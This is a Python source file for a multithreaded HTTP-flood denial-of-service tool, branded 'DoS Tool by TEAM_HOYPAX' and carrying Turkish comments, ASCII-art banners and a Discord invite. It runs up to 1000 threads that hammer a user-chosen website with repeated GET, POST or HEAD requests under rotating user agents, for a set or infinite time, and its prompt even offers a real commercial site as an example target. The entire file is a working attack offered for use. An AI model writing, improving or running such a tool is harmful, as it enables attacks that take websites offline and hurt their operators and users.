import requests
import threading
import time
import random
import os
import re

# ASCII Sanat ve Başlık
ascii_art = """
    ░██████╗░█████╗░██╗░░░██╗██╗░░░░░███████╗██╗░░░░░░█████╗░░█████╗░██████╗░
    ██╔════╝██╔══██╗██║░░░██║██║░░░░░██╔════╝██║░░░░░██╔══██╗██╔══██╗██╔══██╗
    ╚█████╗░██║░░██║██║░░░██║██║░░░░░█████╗░░██║░░░░░██║░░██║██║░░██║██║░░██║
    ░╚═══██╗██║░░██║██║░░░██║██║░░░░░██╔══╝░░██║░░░░░██║░░██║██║░░██║██║░░██║
    ██████╔╝╚█████╔╝╚██████╔╝███████╗██║░░░░░███████╗╚█████╔╝╚█████╔╝██████╔╝
    ╚═════╝░░╚════╝░░╚═════╝░╚══════╝╚═╝░░░░░╚══════╝░╚════╝░░╚════╝░╚═════╝░
       WARSTY[607]
       |X_X| DoS Tool by TEAM_HOYPAX
"""

# Kullanici-Agent Listesi (Rastgele)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def attack(target, method, duration):
    headers = {"User-Agent": random.choice(user_agents)}
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            if not target.startswith(('http://', 'https://')):
                target = 'https://' + target
            response = requests.request(method, target, headers=headers, timeout=5)
            print(f"Request sent: {target} - Method: {method} - Status: {response.status_code}")
            time.sleep(0.1)
        except Exception as e:
            print(f"Error: {target} - Error: {str(e)}")
            break

def main_menu():
    while True:
        clear_screen()
        print(ascii_art)
        print("❯❯❯_Dos")
        print("❯❯❯_Options")
        print("❯❯❯_Time")
        print("❯❯❯_Discord")
        choice = input("Enter your choice: ").strip().lower()

        if choice == "dos":
            target = input("Enter target site (e.g., localhost or chatgpt.com): ")
            return "target", target
        elif choice == "options":
            clear_screen()
            print(ascii_art)
            print("Available methods:")
            print("1. GET")
            print("2. POST")
            print("3. HEAD")
            method_choice = input("Select method (1-3): ").strip()
            methods = {"1": "GET", "2": "POST", "3": "HEAD"}
            return "method", methods.get(method_choice, "GET")
        elif choice == "time":
            clear_screen()
            print(ascii_art)
            duration_input = input("Enter duration (e.g., 33:09 or infinite_time minutes, max 90): ").strip()
            if duration_input.lower() == "infinite_time":
                return "duration", float('inf')
            try:
                match = re.match(r"(\d+):(\d+)", duration_input)
                if match:
                    minutes, seconds = map(int, match.groups())
                    duration = minutes * 60 + seconds
                else:
                    duration = int(duration_input) * 60
                if duration > 90 * 60:
                    print("Max duration is 90 minutes!")
                    return "duration", 15 * 60
                return "duration", duration
            except ValueError:
                print("Invalid format! Using default 15 minutes.")
                return "duration", 15 * 60
        elif choice == "discord":
            print("Join our Discord: discord.gg/wartsy")
            input("Press Enter to continue...")
            return None, None
        else:
            print("Invalid choice! Try again.")

def main():
    target = None
    method = "GET"
    duration = 15 * 60  # Varsayılan 15 dakika

    while True:
        menu_result = main_menu()
        if menu_result is None:
            continue
        choice_type, value = menu_result
        if choice_type == "target":
            target = value
        elif choice_type == "method":
            method = value
        elif choice_type == "duration":
            duration = value

        if target is None:
            print("Please set a target first!")
            continue

        thread_count = int(input("Enter thread count (5-1000): "))
        if thread_count > 1000:
            thread_count = 1000
            print("More than 1000 threads is dangerous, set to 1000!")

        threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=attack, args=(target, method, duration))
            t.start()
            threads.append(t)

        print(f"Attack started on {target} with {thread_count} threads for {duration/60 if duration != float('inf') else 'infinite'} minutes...")
        time.sleep(duration if duration != float('inf') else 300)
        print("Attack stopped!")

        if input("Press Enter to restart or 'x' to exit: ").lower() == 'x':
            break

if __name__ == "__main__":
    main()
